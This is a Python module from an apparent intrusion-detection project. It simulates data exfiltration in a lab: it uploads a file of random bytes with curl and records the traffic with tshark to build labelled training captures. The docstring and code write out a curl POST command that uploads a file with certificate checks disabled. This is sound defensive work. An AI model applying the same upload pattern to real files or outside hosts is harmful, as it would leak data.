"""Data exfiltration lab generator (curl large-upload wrapper).

Generates a data_exfiltration capture by uploading a large randomly-generated
file to a lab HTTP endpoint using curl:

    curl -sSk -X POST -d @<tmpfile> http://<target>:<port>/upload

The file size is configurable (default 5 MB).  curl is used because it
is universally available and produces realistic TCP sessions that the feature
extractor can observe (byte counts, directional volumes, byte_ratio).

Capture starts BEFORE the upload begins so the full flow is recorded.
"""
from __future__ import annotations

import logging
import os
import tempfile
from pathlib import Path

from igu_sentinel.traffic_gen.lab._guard import validate_lab_target
from igu_sentinel.traffic_gen.lab._tools import ensure_tools
from igu_sentinel.traffic_gen.lab.capture import DEFAULT_IFACE, capture_lab_run

log = logging.getLogger("igu_sentinel.traffic_gen.lab")

THREAT_CLASS = "data_exfiltration"


def run(
    target: str,
    duration: int,
    *,
    port: int = 80,
    protocol: str = "http",
    size_bytes: int = 5_000_000,
    iface: str = DEFAULT_IFACE,
    lab_suffix=None,
    out_root: Path | None = None,
    _popen=None,
    _sleep=None,
    **_params,
) -> Path:
    """Generate data-exfiltration traffic to target and capture it.

    Uploads a temporary file of size_bytes bytes to the target endpoint via
    HTTP POST.  The file is filled with pseudo-random bytes (high entropy,
    like encrypted or compressed data a real exfil would carry).

    Args:
        target:     Lab-only endpoint (loopback or RFC1918).
        duration:   Maximum capture window in seconds (upload may finish early).
        port:       Destination port (default 80 for HTTP).
        protocol:   http (default) or https.
        size_bytes: Payload size in bytes (default 5 MB).

    Returns:
        Path to the captured pcap.

    Raises:
        ValueError: if target is not a permitted lab endpoint.
        LabToolMissing: if curl or tshark are not installed.
    """
    validate_lab_target(target, lab_suffix=lab_suffix)
    ensure_tools("curl", "tshark")

    # Write a temp file of pseudo-random bytes to simulate encrypted exfil.
    # The file is created in the system temp dir (not the repo) and deleted
    # after the run.
    fd, tmp_path = tempfile.mkstemp(prefix="igusentinel_exfil_", suffix=".bin")
    try:
        with os.fdopen(fd, "wb") as fh:
            fh.write(os.urandom(size_bytes))

        url = f"{protocol}://{target}:{port}/upload"
        cmd = [
            "curl",
            "-sSk",
            "--max-time", str(int(duration)),
            "-X", "POST",
            "--data-binary", f"@{tmp_path}",
            url,
        ]
        return capture_lab_run(
            threat_class=THREAT_CLASS,
            target=target,
            duration=duration,
            tool_cmd=cmd,
            tool_name="curl",
            iface=iface,
            lab_suffix=lab_suffix,
            out_root=out_root,
            _popen=_popen,
            _sleep=_sleep,
        )
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            log.warning("[lab] could not delete temp exfil file %s", tmp_path)
